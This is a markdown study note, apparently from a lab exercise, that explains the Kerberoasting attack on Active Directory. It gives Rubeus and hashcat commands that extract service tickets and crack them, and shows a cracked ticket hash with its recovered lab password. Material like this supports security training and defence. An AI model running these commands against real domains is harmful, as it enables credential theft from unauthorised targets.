- <span style="color:rgb(255, 255, 0)"><b>Kerberoasting</b></span> is an attack technique used against Active Directory environments to steal and crack the credentials of service accounts.

How it works:
-1) **Service Principal Names (SPNs):** In Active Directory, accounts that run services (like SQL Server, IIS, or custom apps) are often registered with an SPN, which tells Kerberos "this account is associated with this service."

-2) **Requesting a ticket:** Any authenticated domain user can request a Kerberos **service ticket (TGS)** for any account that has an SPN registered — this is normal, legitimate Kerberos behavior, not a vulnerability by itself.

-3) **The ticket's encryption:** That TGS is encrypted using a hash derived from the **service account's password**. Critically, a regular domain user doesn't need any special privileges to request this ticket — just basic domain authentication.

-4) **Offline cracking:** The attacker extracts the encrypted portion of the ticket and takes it offline, then tries to crack it using tools like `hashcat` or `John the Ripper`. If the service account has a weak or guessable password, the attacker recovers the plaintext password without ever touching the domain controller again or triggering lockout policies.

----------------------------------
<span style="color:rgb(255, 255, 0)">1-</span> To obtain crackable tickets, we use Rubeus.exe with the 'kerberoast' action. it will extract tickets for every user that has an SPN registered
```
.\Rubeus.exe kerberoast /outfile:spn.txt
```

<span style="color:rgb(255, 255, 0)">2-</span> We can use `hashcat` with the hash-mode (option `-m`) `13100` for a `Kerberoastable TGS` (may need to pass --force if hashcat throws an error)
```
hashcat -m 13100 -a 0 spn.txt passwords.txt --outfile="cracked.txt"
```

<span style="color:rgb(255, 255, 0)">3-</span> Output of the `cracked.txt` file: User: svc-iam / Password: mariposa
```
$krb5tgs$23$*svc‑iam$eagle.local$http/server1@eagle.local*$eec00b93b179851c5a37003b2689e135$f19fcb833fca54dbda66222114c976a0b03dead2d967c47b20bef742de87c0016ec13022e5884e73d502aeb672e6b80bde698ad5d3d1080e41096215a6f00803097a44e557328439d39f964138b09d1f0fe54f6a6425c9c4552ed1c18fd23c5e26e27a23bd7e6cee65084d3f49567ab5b35c2865bcb5285778a7ac7582c2ff5a9d3f34c78c4c30143499ecf8da947b97c2afa932d009b8488221163ce53942ee59ccd5bbbe54c595f0c9456238bf65ab2fd8cf9ea541e7fbeea6328894caa24409206b327abfe3d0413c2611841840d885746c1929c2d993223951e77ddda7809edba45991bc88985b5108e1404a89a701b85562445dd8dbac226cf08acb5722e7d59712e2d770cc05026c98f93188094084943b8386ab1d688a1ab4b74be1f2c523f2096afb50fdec511ab73226b0d1face7220f2a25bcf84d21a9f24fdd00ef7151ddbd39848b6cefb252567c510b6417e3b3307391118f15c79b6e8b92234e3ff7d639bca8ae32a7508527b1ee9e54d355c17b4dd7ef8f8af53f789eead88bbb374eda14e3c27f2bcfcbe3ca27f1a259aefd14c9b71c663c1abe898e8b486afdafc2df0246e27cb750377ae1a5041411599a5ebb31ce04369c9a3ea517df15a583ec5f5d7e5241852d1e20514bb2c999be3114dbb305bda0be47e13a12ad7b93067bd5c2f56ceee6dd536d0f96f05333e1b2e00b319c3e7ae3577a54f6928112dbcd6625d59cdd5a03c0f214dbf3a913d162606508fd7431201e81fe07e8b9ff99a46de76054c6fa526cb5d1d9002af843c7a94c35953d1d696b4ee7bca969f2632f19625835dae4e6523522b2731de9d1ff62c30c4d0ed1109f09dd98a6041477f08a426e725eb04052677c2f8fed1a4bf947a78d3aaff3f7faab588c8342889b85639df90e3c9272c151d3462aed9c280e917d8102f5f566caafcb786b96a9bfd10fa55ee35af8fd75098b222c2b6f58d355f3159f4ae651e9696865352a31a74a37412df5b9b408447c3a62a5c51319b93eff6914ac2e7872b85b49b05c58aa99bc81de7dbe353ef4beb0146ce174e54bfe80383e1400e72ee9eece70bfd2b67d3c123f7ecaf5bc3c07122a1c95a17a416df881a5404db8bf656d97e6f44de229d31678d2533e6fb440a954b655a683a3b0d88a9af5f3aee53be72efc62ccde0cfa741a65ee8a0fbef04b3a92c751ff5bed0b7d5eb2f444c56e1dd649692cebc4f29bbcb7ca41805f21eef475f30c23ebf7c0f1ab924dae47b14aaaf10c5432dc1c0ff00af504783b3822b56ad6658c13de581104e8c424bb1ec227f3d40dc503e43b950e0c90d9468918c5f6386c6e00c33e6a504a9c77d25f72338932a68008495ab16e83b0c9aa6be514b471e56cee7002d3b2232:mariposa
```